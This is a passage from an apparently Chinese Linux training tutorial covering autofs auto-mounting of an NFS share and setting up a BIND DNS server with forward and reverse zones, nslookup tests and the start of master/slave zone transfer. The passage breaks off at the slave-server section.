<h4 id="autofs-自动挂接服务"><a href="#autofs-自动挂接服务" class="headerlink" title="autofs 自动挂接服务"></a>autofs 自动挂接服务</h4><p>使用的时候挂接，不使用等待5分钟后卸载，而等待的时间时可以调整的，在<code>/etc/sysconfig/autofs</code>配置文件中通过<code>TIMEOUT</code>参数调整，例如<code>TIMEOUT=300</code>。</p>
<ol>
<li><p>软件        autofs</p>
</li>
<li><p>service        autofs</p>
</li>
<li><p>daemon        automount        </p>
</li>
<li><p>配置文件</p>
<ul>
<li>/etc/auto.master    父挂接点</li>
<li>/etc/auto.booboo    子挂接点<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">172.25.0.10:&#x2F;tmp &#x2F;mnt&#x2F;share</span><br><span class="line">		&#x2F;mnt	父挂接点</span><br><span class="line">		share	子挂接点</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>配置文件格式</p>
</li>
</ol>
<p>可以通过<code>man 5 autofs</code>查看配置文件的格式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;etc&#x2F;auto.master</span><br><span class="line">&#x2F;mnt	&#x2F;etc&#x2F;auto.booboo</span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;auto.booboo</span><br><span class="line">share	-rw	172.25.0.10:&#x2F;tmp</span><br></pre></td></tr></table></figure>

<p><strong>自动挂接autofs场景</strong></p>
<p>rhel7 作为nfs网络共享文件系统服务；rhel6作为nfs的客户端现在想自动挂接rhel7的/tmp目录使用，可以通过autofs。</p>
<table>
<thead>
<tr>
<th align="left">主机名</th>
<th align="left">ip地址</th>
<th align="left">软件</th>
<th align="left">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="left">rhel6</td>
<td align="left">172.25.0.11</td>
<td align="left">rpcbind nfs-utils</td>
<td align="left">nfs客户端；autofs服务端</td>
</tr>
<tr>
<td align="left">rhel7</td>
<td align="left">172.25.0.10</td>
<td align="left">rpcbind nfs-utils</td>
<td align="left">nfs服务端</td>
</tr>
</tbody></table>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 ~]# yum install -y autofs</span><br><span class="line">Loaded plugins: product-id, refresh-packagekit, security, subscription-manager</span><br><span class="line">This system is not registered to Red Hat Subscription Management. You can use subscription-manager to register.</span><br><span class="line">Setting up Install Process</span><br><span class="line">Package 1:autofs-5.0.5-88.el6.x86_64 already installed and latest version</span><br><span class="line">Nothing to do</span><br><span class="line">[root@rhel6 ~]# rpm -ql autofs</span><br><span class="line">/etc/auto.master</span><br><span class="line">/etc/auto.misc</span><br><span class="line">/etc/auto.net</span><br><span class="line">/etc/auto.smb</span><br><span class="line">/etc/autofs_ldap_auth.conf</span><br><span class="line">/etc/rc.d/init.d/autofs</span><br><span class="line">/etc/sysconfig/autofs</span><br><span class="line">/misc</span><br><span class="line">/net</span><br><span class="line"></span><br><span class="line">[root@rhel6 ~]# vim /etc/auto.master</span><br><span class="line">/mnt    /etc/auto.booboo</span><br><span class="line">[root@rhel6 ~]# vim /etc/auto.booboo</span><br><span class="line">share   -rw     172.25.0.10:/tmp</span><br><span class="line"></span><br><span class="line">[root@rhel6 ~]# mkdir /mnt/share</span><br><span class="line">[root@rhel6 ~]# service autofs start</span><br><span class="line">Starting automount:                                        [  OK  ]</span><br><span class="line">[root@rhel6 ~]# ll /mnt/share</span><br><span class="line">total 0</span><br><span class="line">drwx------. 3 root root 16 Sep 25 14:59 systemd-private-hPL7GQ</span><br><span class="line">drwx------. 3 root root 16 Sep 25 14:58 systemd-private-jFcaMN</span><br></pre></td></tr></table></figure>


<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><img src="pic/06.png" alt="06"></p>
<p><img src="pic/07.png" alt="07"></p>
]]></content>
      <categories>
        <category>技术培训</category>
        <category>Linux简易服务教程</category>
      </categories>
      <tags>
        <tag>培训</tag>
        <tag>Linux基础服务</tag>
      </tags>
  </entry>
  <entry>
    <title>DNS域名解析服务</title>
    <url>/2016/12/23/booboo_easy_service/01_dns/</url>
    <content><![CDATA[<blockquote>
<p>课程要求</p>
</blockquote>
<ol>
<li>在企业内部搭建一台域名解析服务器DNS正反解析</li>
<li>在企业内部搭建两台域名解析服务器做DNS主辅同步</li>
</ol>
<h3 id="DNS服务"><a href="#DNS服务" class="headerlink" title="DNS服务"></a>DNS服务</h3><p>全称是domain name server域名解析服务。</p>
<p>我们知道每个联网的计算机都有一个ip地址吧？Ip地址是用来做什么的呢？Ip地址是用来和互联网上别的机器进行通讯的。但是ip地址很难记吧？一两个ip地址可能还好，但是，我们每天要访问的网页不仅仅只有一两个吧？</p>
<p>我们记得都是什么呢？<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a>. <a href="http://www.sina.com。我们记住的其实都是字符，都是域名。就像我们的电话号码，很难记，于是我们把电话号码存到手机里，给他起个昵称或者直接输入人名对吧，把电话号码对应成人名吧？然后打电话的时候就直接找到这个人名就好了。">www.sina.com。我们记住的其实都是字符，都是域名。就像我们的电话号码，很难记，于是我们把电话号码存到手机里，给他起个昵称或者直接输入人名对吧，把电话号码对应成人名吧？然后打电话的时候就直接找到这个人名就好了。</a></p>
<p>所以我们系统也是一样，会把ip地址对应成一个主机名。在我们系统里有这么一个文件，就是专门用来做对应关系的，这个文件叫<code>/etc/hosts/</code>，我们可以打开来看一下，一条记录一行，行里面就是主机名和ip地址，当然一个ip地址可以对应多个主机名，就像人有很多的昵称一样。</p>
<p>那么这样是不是就解决问题了，当我们想要访问一个网站的时候，我们就不用输入ip地址，而是可以直接输入主机名就行了，机器会帮我们做一个解析，把主机名对应成ip地址进行通信。早期这样做的确没问题，但是随着互联网愈发的壮大，这个文件就不那么实用了。我们要在机器上配置大量的对应关系，是非常耗时，非常麻烦的，而且要配置的机器可不止一台。比如说我是百度，我希望世界上所有的人都要来访问我的网页，那么，我是不是需要让世界上所有的人都去添加我的ip地址和主机名的对应关系。这个是非常难做到的事情，工作量太大。于是我们就引入了一种新的机制。</p>
<h3 id="DNS的实现原理"><a href="#DNS的实现原理" class="headerlink" title="DNS的实现原理"></a>DNS的实现原理</h3><p>这种机制的作用和hosts文件一样，但是实现方法却不一样，这个机制就叫DNS (Domain name server)。通过dns，我们可以解决这个大批量域名解析的问题。那具体是怎么实现的呢？这就是dns的结构方面的问题了。</p>
<p>我们之前说我们的系统是一个什么样的结构，是不是一个分层式的结构，这个结构的体现方式就是目录吧？对不对。Dns也是如此，它也采用了分层市管理的方式。</p>
<p>不过不同于目录，我们的目录是一个逻辑上的概念，用来帮助我们理解文件系统的一种方式。而dns，他是实实在在的一种管理结构。</p>
<p>那我们来看，目录的至高点是什么。是根吧，对不对，那么对于我们dns来说，既然是分层式管理结构，它也需要有一个至高点吧。这个至高点是什么呢？</p>
<p>我们把它称作根域，以点代表根域。全世界总共有13台根域，是处于至高无上的位置的，只有13台机器。</p>
<p>那么根域下面就是顶级域了，通常我们看到的顶级域有这个com。有org，有cn还有edu等等，这些都是顶级域。顶级域下面管理二级域，以此类推。</p>
<p>FQDN：主机名加上域名，被称作完全合格的域名，fqdn。其实com后面应该有个点的，代表根域。只不过我们现在习惯性的将其省略了。就好像国家管理省，省管理市，市管理县等等</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">完整的域名	www.baidu.com.</span><br><span class="line">.	根域	全球一共13个根域</span><br><span class="line">.com	超级域，一级域</span><br><span class="line">.baidu	二级域</span><br><span class="line">www	主机名</span><br></pre></td></tr></table></figure>

<blockquote>
<blockquote>
<p>举例：寻找新浪的方式。</p>
</blockquote>
</blockquote>
<ol>
<li>先看本地<code>/etc/hosts</code>有没有记录。</li>
<li>找另外一个人问，–&gt;找DNS服务器去问。 在<code>/etc/resolv.conf</code>文件中指定了找谁去问。</li>
</ol>
<p>当然，这先后顺序也是由某个文件决定的。这个文件是<code>/etc/nsswitch.conf</code>.</p>
<p>Windows上面也有</p>
<p>网上邻居&gt;属性&gt;本地连接。</p>
<p><strong>DNS的两种查询方式</strong> 对于DNS服务器，他可能知道也可能不知道，</p>
<p>知道的情况有两种：</p>
<ol>
<li>本地有这个域，能够解析到</li>
<li>本地有缓存，其他人已经来问过sina是谁，那么DNS服务器可以将该结果直接返回给客户。</li>
</ol>
<p>不知道的话就会去找自己的上级域，然后通过等待上级域的反馈，将反馈信息返回给客户端。这种方式叫做递归查询。</p>
<p>那么还有一种情况就是，DNS去询问上级域，然后上级域将对应的同级DNS服务器反馈回来，由客户端去询问新的DNS服务器来找寻网””址对应的IP地址。这种叫做迭代查询</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www.sina.com.</span><br><span class="line">1)找根域.</span><br><span class="line">2)找超级域.com</span><br><span class="line">3)找二级域.sina</span><br><span class="line">4)成功找到www</span><br></pre></td></tr></table></figure>


<h3 id="实战项目1-在企业内部搭建一台域名解析服务器DNS正反解析"><a href="#实战项目1-在企业内部搭建一台域名解析服务器DNS正反解析" class="headerlink" title="实战项目1:在企业内部搭建一台域名解析服务器DNS正反解析"></a>实战项目1:在企业内部搭建一台域名解析服务器DNS正反解析</h3><blockquote>
<p>1)在rhel6上配置dns域名解析服务，解析uplooking.com域名，要求如下：</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">        NS      @</span><br><span class="line">        A       172.25.0.11</span><br><span class="line">www     A       172.25.0.10</span><br><span class="line">        MX 5    mail</span><br><span class="line">mail    A       172.25.0.10</span><br><span class="line">ftp     A       172.25.0.10</span><br><span class="line">bbs	CNAME	ftp</span><br></pre></td></tr></table></figure>
<blockquote>
<p>2)配置反向解析172.25.0.10和172.25.0.11；</p>
</blockquote>
<blockquote>
<p>3)要求rhel6和rhel7这两台服务器的域名解析服务器为172.25.0.11这台服务器。</p>
</blockquote>
<h4 id="实验准备阶段"><a href="#实验准备阶段" class="headerlink" title="实验准备阶段"></a>实验准备阶段</h4><ol>
<li>画出网络拓扑图</li>
<li>规划不同服务器需要安装的软件(os–soft版本)</li>
<li>开始安装</li>
<li>配置服务</li>
<li>启动服务</li>
<li>测试排错</li>
</ol>
<blockquote>
<p>详细步骤概览</p>
</blockquote>
<table>
<thead>
<tr>
<th align="left">num</th>
<th align="left">step</th>
<th align="left">man</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1)</td>
<td align="left">安装软件</td>
<td align="left">bind bind-chroot</td>
</tr>
<tr>
<td align="left">2)</td>
<td align="left">查看软件架构</td>
<td align="left">rpm -ql</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">日志</td>
<td align="left">/var/log/named.log</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">数据</td>
<td align="left">/var/named/</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">配置</td>
<td align="left">/etc/named.conf</td>
</tr>
<tr>
<td align="left"></td>
<td align="left"></td>
<td align="left">/etc/named.rfc1912.zones</td>
</tr>
<tr>
<td align="left">3)</td>
<td align="left">修改配置文件</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">4)</td>
<td align="left">启动服务</td>
<td align="left"></td>
</tr>
<tr>
<td align="left"></td>
<td align="left">service</td>
<td align="left">named</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">daemon</td>
<td align="left">named</td>
</tr>
<tr>
<td align="left">4.1）</td>
<td align="left">排除错误</td>
<td align="left">看日志</td>
</tr>
<tr>
<td align="left">5)</td>
<td align="left">测试</td>
<td align="left">nslookup</td>
</tr>
<tr>
<td align="left">5.1）</td>
<td align="left">排错</td>
<td align="left">看日志</td>
</tr>
</tbody></table>
<blockquote>
<p>网络拓扑图</p>
</blockquote>
<p><img src="pic/12.png" alt="12"></p>
<blockquote>
<p>规划服务器软件</p>
</blockquote>
<p><img src="pic/11.png" alt="11"></p>
<blockquote>
<p>开始安装</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 ~]# yum install -y bind bind-chroot</span><br><span class="line">Loaded plugins: product-id, refresh-packagekit, security, subscription-manager</span><br><span class="line">This system is not registered to Red Hat Subscription Management. You can use subscription-manager to register.</span><br><span class="line">server                                                   | 3.9 kB     00:00     </span><br><span class="line">Setting up Install Process</span><br><span class="line">Resolving Dependencies</span><br><span class="line"><span class="meta">--&gt;</span><span class="bash"> Running transaction check</span></span><br><span class="line"><span class="meta">---&gt;</span><span class="bash"> Package bind.x86_64 32:9.8.2-0.17.rc1.el6_4.6 will be installed</span></span><br><span class="line"><span class="meta">---&gt;</span><span class="bash"> Package <span class="built_in">bind</span>-chroot.x86_64 32:9.8.2-0.17.rc1.el6_4.6 will be installed</span></span><br><span class="line"><span class="meta">--&gt;</span><span class="bash"> Finished Dependency Resolution</span></span><br><span class="line"></span><br><span class="line">Dependencies Resolved</span><br><span class="line"></span><br><span class="line">================================================================================</span><br><span class="line"> Package          Arch        Version                         Repository   Size</span><br><span class="line">================================================================================</span><br><span class="line">Installing:</span><br><span class="line"> bind             x86_64      32:9.8.2-0.17.rc1.el6_4.6       server      4.0 M</span><br><span class="line"> bind-chroot      x86_64      32:9.8.2-0.17.rc1.el6_4.6       server       71 k</span><br><span class="line"></span><br><span class="line">Transaction Summary</span><br><span class="line">================================================================================</span><br><span class="line">Install       2 Package(s)</span><br><span class="line"></span><br><span class="line">Total download size: 4.0 M</span><br><span class="line">Installed size: 7.3 M</span><br><span class="line">Downloading Packages:</span><br><span class="line">(1/2): bind-9.8.2-0.17.rc1.el6_4.6.x86_64.rpm            | 4.0 MB     00:00     </span><br><span class="line">(2/2): bind-chroot-9.8.2-0.17.rc1.el6_4.6.x86_64.rpm     |  71 kB     00:00     </span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">Total                                            23 MB/s | 4.0 MB     00:00     </span><br><span class="line">Running rpm_check_debug</span><br><span class="line">Running Transaction Test</span><br><span class="line">Transaction Test Succeeded</span><br><span class="line">Running Transaction</span><br><span class="line">  Installing : 32:bind-9.8.2-0.17.rc1.el6_4.6.x86_64                        1/2</span><br><span class="line">  Installing : 32:bind-chroot-9.8.2-0.17.rc1.el6_4.6.x86_64                 2/2</span><br><span class="line">  Verifying  : 32:bind-9.8.2-0.17.rc1.el6_4.6.x86_64                        1/2</span><br><span class="line">  Verifying  : 32:bind-chroot-9.8.2-0.17.rc1.el6_4.6.x86_64                 2/2</span><br><span class="line"></span><br><span class="line">Installed:</span><br><span class="line">  bind.x86_64 32:9.8.2-0.17.rc1.el6_4.6                                         </span><br><span class="line">  bind-chroot.x86_64 32:9.8.2-0.17.rc1.el6_4.6                                  </span><br><span class="line"></span><br><span class="line">Complete!</span><br><span class="line">[root@rhel6 ~]# rpm -ql bind</span><br><span class="line">/etc/NetworkManager/dispatcher.d/13-named</span><br><span class="line">/etc/logrotate.d/named</span><br><span class="line">/etc/named</span><br><span class="line">/etc/named.conf</span><br><span class="line">/etc/named.iscdlv.key</span><br><span class="line">/etc/named.rfc1912.zones</span><br><span class="line">/etc/named.root.key</span><br><span class="line">/etc/portreserve/named</span><br><span class="line">/etc/rc.d/init.d/named</span><br><span class="line">/etc/rndc.conf</span><br><span class="line">/etc/rndc.key</span><br><span class="line">/etc/sysconfig/named</span><br><span class="line">/usr/lib64/bind</span><br><span class="line">/usr/sbin/arpaname</span><br><span class="line">/usr/sbin/ddns-confgen</span><br><span class="line">/usr/sbin/dnssec-dsfromkey</span><br><span class="line">/usr/sbin/dnssec-keyfromlabel</span><br><span class="line">/usr/sbin/dnssec-keygen</span><br><span class="line">/usr/sbin/dnssec-revoke</span><br><span class="line">/usr/sbin/dnssec-settime</span><br><span class="line">/usr/sbin/dnssec-signzone</span><br><span class="line">/usr/sbin/genrandom</span><br><span class="line">/usr/sbin/isc-hmac-fixup</span><br><span class="line">/usr/sbin/lwresd</span><br><span class="line">/usr/sbin/named</span><br><span class="line">/usr/sbin/named-checkconf</span><br><span class="line">/usr/sbin/named-checkzone</span><br><span class="line">/usr/sbin/named-compilezone</span><br><span class="line">/usr/sbin/named-journalprint</span><br><span class="line">/usr/sbin/nsec3hash</span><br><span class="line">/usr/sbin/rndc</span><br><span class="line">/usr/sbin/rndc-confgen</span><br><span class="line">/usr/share/doc/bind-9.8.2</span><br><span class="line">... ...</span><br><span class="line">/var/log/named.log</span><br><span class="line">/var/named</span><br><span class="line">/var/named/data</span><br><span class="line">/var/named/dynamic</span><br><span class="line">/var/named/named.ca</span><br><span class="line">/var/named/named.empty</span><br><span class="line">/var/named/named.localhost</span><br><span class="line">/var/named/named.loopback</span><br><span class="line">/var/named/slaves</span><br><span class="line">/var/run/named</span><br><span class="line">[root@rhel6 ~]# rpm -ql bind-chroot</span><br><span class="line">/var/named/chroot</span><br><span class="line">/var/named/chroot/dev</span><br><span class="line">/var/named/chroot/dev/null</span><br><span class="line">/var/named/chroot/dev/random</span><br><span class="line">/var/named/chroot/dev/zero</span><br></pre></td></tr></table></figure>

<blockquote>
<p>配置文件</p>
</blockquote>
<blockquote>
<blockquote>
<p>/etc/named.conf</p>
</blockquote>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">listen-on port 53 &#123; any; &#125;;</span><br><span class="line">listen-on-v6 port 53 &#123; any; &#125;;</span><br><span class="line">directory 	"/var/named";</span><br><span class="line">dump-file 	"/var/named/data/cache_dump.db";</span><br><span class="line">       statistics-file "/var/named/data/named_stats.txt";</span><br><span class="line">       memstatistics-file "/var/named/data/named_mem_stats.txt";</span><br><span class="line">allow-query     &#123; any; &#125;;</span><br></pre></td></tr></table></figure>

<blockquote>
<blockquote>
<p>/etc/named.rfc1912.zones</p>
</blockquote>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 正解析</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 域名--&gt;ip</span></span><br><span class="line">zone "uplooking.com" IN &#123;</span><br><span class="line">        type master;</span><br><span class="line">        file "named.uplooking";</span><br><span class="line">        allow-update &#123; none; &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#</span><span class="bash"> 反解析</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ip---&gt;域名</span></span><br><span class="line">zone "0.25.172.in-addr.arpa" IN &#123;</span><br><span class="line">        type master;</span><br><span class="line">        file "named.arpa.uplooking";</span><br><span class="line">        allow-update &#123; none; &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<blockquote>
<blockquote>
<p>/var/named/named.uplooking</p>
</blockquote>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">TTL 1D</span></span><br><span class="line">@       IN SOA  @ rname.invalid. (</span><br><span class="line">                                        0       ; serial</span><br><span class="line">                                        1D      ; refresh</span><br><span class="line">                                        1H      ; retry</span><br><span class="line">                                        1W      ; expire</span><br><span class="line">	                                       3H )    ; minimum</span><br><span class="line">主机名	主要记录	ip</span><br><span class="line">        NS      @</span><br><span class="line">        A       172.25.0.11</span><br><span class="line">www     A       172.25.0.10</span><br><span class="line">        MX 5    mail</span><br><span class="line">mail    A       172.25.0.10</span><br><span class="line">ftp     A       172.25.0.10</span><br><span class="line">bbs	CNAME	ftp</span><br></pre></td></tr></table></figure>
<p><strong>注意</strong> 文件的所属者和所属组以及文件的ugo权限</p>
<blockquote>
<blockquote>
<p>named.arpa.uplooking</p>
</blockquote>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">TTL 1D</span></span><br><span class="line">@       IN SOA  @ rname.invalid. (</span><br><span class="line">                                        0       ; serial</span><br><span class="line">                                        1D      ; refresh</span><br><span class="line">                                        1H      ; retry</span><br><span class="line">                                        1W      ; expire</span><br><span class="line">                                        3H )    ; minimum</span><br><span class="line">        NS      uplooking.com.</span><br><span class="line">11      PTR     uplooking.com.</span><br><span class="line">10      PTR     www.uplooking.com.</span><br><span class="line">10      PTR     mail.uplooking.com.</span><br><span class="line">10      PTR     ftp.uplooking.com.</span><br><span class="line">10      PTR     bbs.uplooking.com.</span><br></pre></td></tr></table></figure>
<p><strong>注意：</strong>    NS后面此时一定要将@换成域名uplooking.com.域名必须写完整的域名，带根域的</p>
<blockquote>
<p>服务的启动</p>
</blockquote>
<ul>
<li>rhel6    <code>service named start</code></li>
<li>rhel7    <code>systemctl start named</code></li>
</ul>
<blockquote>
<p>防火墙的关闭</p>
</blockquote>
<ul>
<li>rhel6    <code>service iptables stop</code></li>
<li>rhel7    <code>systemctl stop firewalld</code></li>
</ul>
<p><strong>如果服务启动不了</strong> 那么尝试执行以下语句<code>rndc-confgen -a -r /etc/named.conf</code></p>
<blockquote>
<p>测试</p>
</blockquote>
<ol>
<li><code>/etc/hosts</code>        系统管理员手动写</li>
<li><code>/etc/resolv.conf</code>—-》指定找哪个域名解析服务器<code>nameserver 172.25.0.11</code></li>
<li>通过<code>nslookup</code>命令</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">[root@rhel6 named]# nslookup</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> www.uplooking.com</span></span><br><span class="line">Server:		172.25.0.11</span><br><span class="line">Address:	172.25.0.11#53</span><br><span class="line"></span><br><span class="line">Name:	www.uplooking.com</span><br><span class="line">Address: 172.25.0.10</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> mail.uplooking.com</span></span><br><span class="line">Server:		172.25.0.11</span><br><span class="line">Address:	172.25.0.11#53</span><br><span class="line"></span><br><span class="line">Name:	mail.uplooking.com</span><br><span class="line">Address: 172.25.0.10</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> ftp.uplooking.com</span></span><br><span class="line">Server:		172.25.0.11</span><br><span class="line">Address:	172.25.0.11#53</span><br><span class="line"></span><br><span class="line">Name:	ftp.uplooking.com</span><br><span class="line">Address: 172.25.0.10</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> uplooking.com</span></span><br><span class="line">Server:		172.25.0.11</span><br><span class="line">Address:	172.25.0.11#53</span><br><span class="line"></span><br><span class="line">Name:	uplooking.com</span><br><span class="line">Address: 172.25.0.11</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> bbs.uplooking.com</span></span><br><span class="line">Server:		172.25.0.11</span><br><span class="line">Address:	172.25.0.11#53</span><br><span class="line"></span><br><span class="line">bbs.uplooking.com	canonical name = ftp.uplooking.com.</span><br><span class="line">Name:	ftp.uplooking.com</span><br><span class="line">Address: 172.25.0.10</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 172.25.0.10</span></span><br><span class="line">Server:		172.25.0.11</span><br><span class="line">Address:	172.25.0.11#53</span><br><span class="line"></span><br><span class="line">10.0.25.172.in-addr.arpa	name = bbs.uplooking.com.</span><br><span class="line">10.0.25.172.in-addr.arpa	name = www.uplooking.com.</span><br><span class="line">10.0.25.172.in-addr.arpa	name = mail.uplooking.com.</span><br><span class="line">10.0.25.172.in-addr.arpa	name = ftp.uplooking.com.</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 172.25.0.11</span></span><br><span class="line">Server:		172.25.0.11</span><br><span class="line">Address:	172.25.0.11#53</span><br><span class="line"></span><br><span class="line">11.0.25.172.in-addr.arpa	name = uplooking.com.</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="built_in">exit</span></span></span><br></pre></td></tr></table></figure>

<hr>
<h3 id="实战项目2-在企业内部搭建两台域名解析服务器做DNS主辅同步"><a href="#实战项目2-在企业内部搭建两台域名解析服务器做DNS主辅同步" class="headerlink" title="实战项目2:在企业内部搭建两台域名解析服务器做DNS主辅同步"></a>实战项目2:在企业内部搭建两台域名解析服务器做DNS主辅同步</h3><p>主辅同步：如果有数万台客户机在同一时间来访问DNS服务器，会导致服务器承受很大的压力，这时候我可能需要另外一个人来帮我分担压力，或者说如果主服务器遇到什么问题，我能有另外一个人直接顶上我的工作，这时候就可以用到一个辅助服务器了。</p>
<p>那么很显然，辅助服务器需要和主服务器用一样的配置，配置里写的数据也基本相同。对于我们DNS服务器来说，其实它的数据文件并不固定，对应的IP和主机名都可能会经常发生变化，那么当那个时候，我希望能够修改主机上的某一个文件的时候，从机上的文件也能够被自动被修改，保持两台机器完全同步一致。</p>
<p>这时候就有了一种配置方法，叫做主辅同步。</p>
<h4 id="实验准备阶段-1"><a href="#实验准备阶段-1" class="headerlink" title="实验准备阶段"></a>实验准备阶段</h4><ol>
<li>网络拓扑图</li>
<li>规划软件安装bind bind-chroot</li>
<li>修改配置文件<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#主服务器	&#x2F;etc&#x2F;named.rfc1912.zones	允许传输给从机</span><br><span class="line">		&#x2F;var&#x2F;named&#x2F;named.uplooking	序列号从0改成日期</span><br><span class="line">		&#x2F;var&#x2F;named&#x2F;named.arpa.uplooking 序列号从0改成日期</span><br><span class="line">#从服务器	&#x2F;etc&#x2F;named.conf			any</span><br><span class="line">		&#x2F;etc&#x2F;named.rfc1912.zones	slave;masters;file</span><br></pre></td></tr></table></figure></li>
<li>启动从机服务</li>
<li>查看从机缓冲/var/named/slaves/</li>
<li>注意防火墙关闭</li>
<li>客户端测试服务        </li>
</ol>
<h4 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h4><blockquote>
<p>网络拓扑图</p>
</blockquote>
<p><img src="pic/14.png" alt="14"></p>
<blockquote>
<p>规划软件安装</p>
</blockquote>
<p><img src="pic/13.png" alt="13"></p>
<blockquote>
<p>主服务器：</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 named]# vim /etc/named.rfc1912.zones</span><br><span class="line">zone "uplooking.com" IN &#123;</span><br><span class="line">        type master;</span><br><span class="line">        file "named.uplooking";</span><br><span class="line">        allow-update &#123; none; &#125;;</span><br><span class="line">        allow-transfer &#123; 172.25.0.10; &#125;;    	===&gt;允许从机172.25.0.10来读取</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">zone "0.25.172.in-addr.arpa" IN &#123;</span><br><span class="line">        type master;</span><br><span class="line">        file "named.arpa.uplooking";</span><br><span class="line">        allow-update &#123; none; &#125;;</span><br><span class="line">        allow-transfer &#123; 172.25.0.10; &#125;;	===&gt;允许从机172.25.0.10来读取</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">[root@rhel6 named]# pwd</span><br><span class="line">/var/named</span><br><span class="line">[root@rhel6 named]# ll</span><br><span class="line">total 40</span><br><span class="line">drwxr-x---. 6 root  named 4096 Aug  2 10:30 chroot</span><br><span class="line">drwxrwx---. 2 named named 4096 Aug  2 11:03 data</span><br><span class="line">drwxrwx---. 2 named named 4096 Aug  2 15:06 dynamic</span><br><span class="line">-rw-r-----. 1 root  named  271 Aug  2 13:59 named.arpa.uplooking</span><br><span class="line">-rw-r-----. 1 root  named 1892 Feb 18  2008 named.ca</span><br><span class="line">-rw-r-----. 1 root  named  152 Dec 15  2009 named.empty</span><br><span class="line">-rw-r-----. 1 root  named  152 Jun 21  2007 named.localhost</span><br><span class="line">-rw-r-----. 1 root  named  168 Dec 15  2009 named.loopback</span><br><span class="line">-rw-r-----. 1 root  named  224 Aug  2 11:34 named.uplooking</span><br><span class="line">drwxrwx---. 2 named named 4096 Aug 14  2013 slaves</span><br><span class="line">[root@rhel6 named]# vim named.uplooking</span><br><span class="line"><span class="meta">$</span><span class="bash">TTL 1D</span></span><br><span class="line">@       IN SOA  @ rname.invalid. (</span><br><span class="line">                                        20160802        ; serial</span><br><span class="line">                                        1D      ; refresh</span><br><span class="line">                                        1H      ; retry</span><br><span class="line">                                        1W      ; expire</span><br><span class="line">                                        3H )    ; minimum</span><br><span class="line">        NS      @</span><br><span class="line">        A       172.25.0.11</span><br><span class="line">www     A       172.25.0.10</span><br><span class="line">        MX 5    mail</span><br><span class="line">mail    A       172.25.0.10</span><br><span class="line">ftp     A       172.25.0.10</span><br><span class="line">bbs     CNAME   ftp</span><br><span class="line">~                        </span><br><span class="line"></span><br><span class="line">[root@rhel6 named]# vim named.arpa.uplooking</span><br><span class="line"><span class="meta">$</span><span class="bash">TTL 1D</span></span><br><span class="line">@       IN SOA  @ rname.invalid. (</span><br><span class="line">                                        20160802        ; serial</span><br><span class="line">                                        1D      ; refresh</span><br><span class="line">                                        1H      ; retry</span><br><span class="line">                                        1W      ; expire</span><br><span class="line">                                        3H )    ; minimum</span><br><span class="line">        NS      uplooking.com.</span><br><span class="line">11      PTR     uplooking.com.</span><br><span class="line">10      PTR     www.uplooking.com.</span><br><span class="line">10      PTR     mail.uplooking.com.</span><br><span class="line">10      PTR     ftp.uplooking.com.</span><br><span class="line">10      PTR     bbs.uplooking.com.</span><br><span class="line"></span><br><span class="line">[root@rhel6 named]# service named restart</span><br><span class="line">Stopping named: .                                          [  OK  ]</span><br><span class="line">Starting named:                                            [  OK  ]</span><br><span class="line">[root@rhel6 named]# service iptables stop</span><br><span class="line">iptables: Firewall is not running.</span><br><span class="line">[root@rhel6 named]# getenforce</span><br><span class="line">Enforcing</span><br></pre></td></tr></table></figure>

<blockquote>
<p>从服务器</p>
</blockquote>
